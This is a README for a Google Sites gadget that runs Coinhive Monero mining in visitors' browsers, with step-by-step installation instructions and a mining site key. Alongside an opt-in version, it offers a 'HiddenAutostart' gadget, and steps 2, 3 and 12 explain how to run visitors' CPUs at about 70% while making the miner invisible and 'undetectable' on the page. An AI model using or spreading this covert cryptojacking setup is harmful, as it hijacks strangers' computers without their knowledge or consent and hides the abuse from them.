# Coinhive Google Sites Gadget
A [Coinhive](https://coinhive.com/) Monero mining Gadget for Google Sites.

## HiddenAutostart Gadget:
 Not visible on the page and does not notify the client visiting the webpage.
## OptIn Gadget: 
 Requires the client to click start and allows the user change speed (throttle) and amount of CPU threads used for mining.

# How to install
1. Download which gadget you want.
2. Edit the XML file and replace the Coinhive Site Public key. Mine is: **M7RVhmPbPET48OxR5fLku1Xe2WkNo5w0**
3. **Optional** Change the throttle value to increase or decrease the impact of the mining gadget on the clients computer. The default throttle is 0.3 which translates to 30%. With a throttle of 30% the clients CPU will be running at **70%**.
4. Once you have your final XML file. Go to your Google Site dashboard and click on "Manage Site".

![Alt text](https://sites.google.com/site/unblockedhackedhalo/GithubCoinhiveStep1.JPG)

5.In the settings click on "Attachments".

![Alt text](https://sites.google.com/site/unblockedhackedhalo/GithubCoinhiveStep2.JPG)

6.Click on "Upload" and chose the modified XML file.

![Alt text](https://sites.google.com/site/unblockedhackedhalo/GithubCoinhiveStep3.JPG)

7.Look at where the file is located. If you uploaded the file to a different place then the path to the file will be different. If you don't upload the file to a folder the default location is "/". This is important for when you add the gadget to a page on your site.

![Alt text](https://sites.google.com/site/unblockedhackedhalo/GithubCoinhiveStep4.JPG)

8.It is time to add the gadget to a page on your Google Site. Go to the page you want to add the gadget to and click the "Edit" pencil icon.

![Alt text](https://sites.google.com/site/unblockedhackedhalo/GithubCoinhiveStep5.JPG)

9.Click on "Insert" and then "More Gadgets..."

![Alt text](https://sites.google.com/site/unblockedhackedhalo/GithubCoinhiveStep6.JPG)

10.Click on "Add gadget by URL". Delete the "http://" that is filled in for you. Then copy the URL of your website and add the location of the file from step 7 to the end of the URL. Since our file is uploaded to the default location of "/" we just need to make sure there is a single / at the end of the URL.

![Alt text](https://sites.google.com/site/unblockedhackedhalo/GithubCoinhiveStep7.JPG)

11.Now add the file name of the gadget to the URL right after the "/". Make sure what you add to the end of the URL is the same as the name of the file in the "Attachments" menu where you uploaded the file. **You have to include the file extension. In our case it is .xml**. Then click "Add".

![Alt text](https://sites.google.com/site/unblockedhackedhalo/GithubCoinhiveStep8.JPG)

12.A new window will appear whith the gadget settings. **If you are using the HiddenAutostart gadget follow these instructions:** Set "Width" to 10 and click the box "Percent" and change it to "pixels". Set the "Height" to 10. **Un**check the boxes "Include a border around gadget" and "Display title on gadget". This will make your gadget undetectable on the page. **If you are using the OptIn gadget follow these instructions:** Depending on the other content on your page you might want to play around with the settings for "Width" and "Height". But **Un**check the box for "Include a border around gadget". You can include a title if you want.

Picture is for the **HiddenAutostart**
![Alt text](https://sites.google.com/site/unblockedhackedhalo/GithubCoinhiveStep9.JPG)
